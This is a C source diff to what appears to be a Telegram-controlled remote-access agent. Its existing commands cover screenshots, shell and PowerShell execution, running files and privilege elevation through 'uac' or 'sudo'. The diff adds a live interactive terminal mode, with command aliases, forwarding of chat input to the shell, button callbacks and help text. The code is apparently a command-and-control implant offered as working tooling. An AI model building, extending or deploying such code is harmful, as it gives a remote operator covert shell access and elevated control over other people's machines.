@@ -30,6 +30,7 @@
 #include "../screenshot/screenshot.h"
 #include "../screenshot/screenshot_output.h"
 #include "../shell/shell_output.h"
+#include "../shell/shell_live.h"
 #include "telegram.h"
 #include "telegram_platform.h"
 
@@ -234,6 +235,7 @@ typedef enum {
   CMD_SESSION_STATUS,
   CMD_RUNFILE,
   CMD_SHELL_HELP,
+  CMD_SHELL_LIVE,
   CMD_ELEVATE,
   CMD_HELP
 } c2t_cmd_id_t;
@@ -311,6 +313,7 @@ static const cmd_entry_t g_cmd_mappings[] = {
   {"sh_status", CMD_SESSION_STATUS}, {"session_status", CMD_SESSION_STATUS}, {"shell_status", CMD_SESSION_STATUS},
   {"runfile", CMD_RUNFILE}, {"execfile", CMD_RUNFILE}, {"runscript", CMD_RUNFILE}, {"exec_file", CMD_RUNFILE}, {"run_file", CMD_RUNFILE}, {"script", CMD_RUNFILE},
   {"shell_help", CMD_SHELL_HELP}, {"sh_help", CMD_SHELL_HELP}, {"shhelp", CMD_SHELL_HELP}, {"shellhelp", CMD_SHELL_HELP},
+  {"shell_live", CMD_SHELL_LIVE}, {"sh_live", CMD_SHELL_LIVE}, {"live_shell", CMD_SHELL_LIVE}, {"live", CMD_SHELL_LIVE}, {"interactive", CMD_SHELL_LIVE}, {"terminal_live", CMD_SHELL_LIVE}, {"term", CMD_SHELL_LIVE}, {"pty", CMD_SHELL_LIVE},
   {"elevate", CMD_ELEVATE}, {"admin", CMD_ELEVATE}, {"sudo", CMD_ELEVATE}, {"uac", CMD_ELEVATE}, {"getadmin", CMD_ELEVATE}, {"privilege", CMD_ELEVATE}, {"privileges", CMD_ELEVATE}, {"root", CMD_ELEVATE},
   {"help", CMD_HELP}
 };
@@ -990,6 +993,12 @@ static void handle_command(const telegram_incoming_update_t *update,
 
   c2t_log_info("listener", "Executing Telegram command '%s' from chat %s", text,
                chat_id);
+
+  if (c2t_shell_live_is_active()) {
+    if (c2t_shell_live_handle_input(text)) {
+      return;
+    }
+  }
 
   c2t_cmd_id_t cmd = lookup_command_id(text);
   switch (cmd) {
@@ -1732,6 +1741,14 @@ static void handle_command(const telegram_incoming_update_t *update,
     break;
   }
 
+  case CMD_SHELL_LIVE: {
+    const char *arg = get_command_argument(text);
+    while (*arg && isspace((unsigned char)*arg))
+      arg++;
+    (void)c2t_shell_live_start(*arg ? arg : nullptr);
+    break;
+  }
+
   case CMD_ELEVATE: {
     char elev_msg[1024] = {};
     (void)c2t_runtime_request_elevation(elev_msg, sizeof(elev_msg));
@@ -2418,6 +2435,7 @@ static void handle_command(const telegram_incoming_update_t *update,
 
     static const char shell_sec[] =
         "<b>Shell &amp; Script Execution:</b>\n"
+        "• <code>/shell_live [shell]</code> (or <code>/live</code>) - Enter live interactive terminal mode (no / prefix needed)\n"
         "• <code>/sh &lt;command&gt;</code> - Execute command in default OS shell\n"
         "• <code>/ps &lt;command&gt;</code> - Execute command in PowerShell\n"
         "• <code>/bash &lt;command&gt;</code> - Execute command in GNU Bash\n"
@@ -2480,6 +2498,7 @@ static int is_heavy_command(c2t_cmd_id_t cmd) {
   case CMD_SESSION_STOP:
   case CMD_SESSION_STATUS:
   case CMD_RUNFILE:
+  case CMD_SHELL_LIVE:
   case CMD_LOGS:
   case CMD_RESTART:
   case CMD_RESTART_KEYBOARD:
@@ -2590,6 +2609,13 @@ on_telegram_command_received(const telegram_incoming_update_t *update,
     return;
   }
 
+  /* Handle inline keyboard button callbacks */
+  if (update->callback_query_id && update->callback_data) {
+    (void)c2t_shell_live_handle_callback(update->callback_query_id,
+                                        update->callback_data);
+    return;
+  }
+
   /* If incoming update has an attached file/document/photo */
   if (update->file_id && *update->file_id) {
     c2t_log_info(
@@ -2620,7 +2646,7 @@ on_telegram_command_received(const telegram_incoming_update_t *update,
     telegram_incoming_update_t eff_update = *update;
     eff_update.text = cmd_text;
     c2t_cmd_id_t cmd_id = lookup_command_id(cmd_text);
-    if (user_data != nullptr && is_heavy_command(cmd_id)) {
+    if (user_data != nullptr && (is_heavy_command(cmd_id) || c2t_shell_live_is_active())) {
       async_cmd_ctx_t *ctx =
           (async_cmd_ctx_t *)calloc(1, sizeof(async_cmd_ctx_t));
       if (ctx) {
